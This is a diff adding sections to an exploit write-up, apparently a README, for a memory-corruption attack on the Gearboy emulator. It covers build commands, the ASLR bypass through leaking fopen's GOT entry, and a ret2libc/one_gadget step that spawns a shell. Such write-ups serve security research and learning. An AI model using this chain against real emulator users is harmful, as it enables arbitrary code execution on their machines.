@@ -79,6 +79,27 @@ The state file format on Linux is as follows:
 The PC (program counter) register is reset to `0x0200` (`main`).
 The `m_iCurrentWRAMBank` parameter is set as described below.
 
+For simplicity, also added were the following commands.
+
+```
+cd ./state
+
+make run_local # Build exploit and launch gearboy directly (macOS)
+make run       # Build exploit and launch gearboy in Docker container
+make run_debug # Like "run", but with Radare2 debugger
+```
+
+### Helper routines
+
+The Gameboy CPU has 8-bit wide general-purpose registers,
+so we need to implement handling of 64-bit values used in the exploit ourselves.
+
+[`pwn.s`](./rom/pwn.s) contains a few helper macros and subroutines.
+- memcpy, memset: As you know them
+- memcpy_8: Copy 64-bit integer
+- add_ptr_3: Add 24-bit integer to 64-bit integer
+- sub_ptr_3: Subtract 24-bit integer from 64-bit integer
+
 ## Stage 1: Full memory access
 
 ### Memory Exposure
@@ -116,8 +137,56 @@ With a code offset into `gearboy:<.text>`, we can leak symbols from the shared l
 
 ## Stage 2: ASLR
 
-TODO
+Our best bet for exploitation is ROP.
+The `gearboy` binary doesn't contain any useful vectors, so we'll use ret2libc.
 
-## Stage 3: ROP chain
+This requires us to know the libc base address and stack pointer.
 
-TODO
+Currently, we only have access to the heap and gearboy base address (via the above function pointer table).
+
+### libc base address
+
+Using the memory r/w primitive from stage 1, we can dereference pointers.
+To follow a pointer, we copy the pointer to the `m_pRAMBanks` field to map its content in `0xa000` in the emulator.
+
+This is all we need to locate libc.
+- Locate a call to a libc function in the gearboy binary,
+  e.g. [this call to `fopen`](https://github.com/drhelius/Gearboy/blob/04b6751a85759af0ed126c1b0ca6685b84ebd5a9/platforms/desktop-shared/config.cpp#L264).
+- Follow offset to reveal the PLT entry of `fopen`.
+  ```
+  0:  f3 0f 1e fa             endbr64
+  4:  f2 ff 25 0d 01 04 00    bnd jmp QWORD PTR [rip+0x4010d]
+  b:  0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
+  ```
+- Follow offset of `jmp` instruction in PLT to reveal GOT entry.
+- Read `fopen` address from GOT entry.
+
+## Stage 3: Shell
+
+With libc base known and RIP control, we do a classic jump to libc.
+
+```
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' fopen@'
+   182: 0000000000082910   246 FUNC    GLOBAL DEFAULT   15 fopen@@GLIBC_2.2.5
+$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0xe3afe execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+$ python3
+>>> hex(0xe3afe-0x0000000000082910)
+'0x611ee'
+```
+
+The constraints are already met:
+- `r15` already points to null bytes.
+- `r12` happens to be the opcode being executed.
+  We wanted to overwrite opcode `0x00` (nop) anyways, so that's fine.
+
+We map back our `Processor::m_OPCodes` buffer from the very beginning and write our gadget address.
+
+No operation is left to be done.
+
+```
+nop
+```
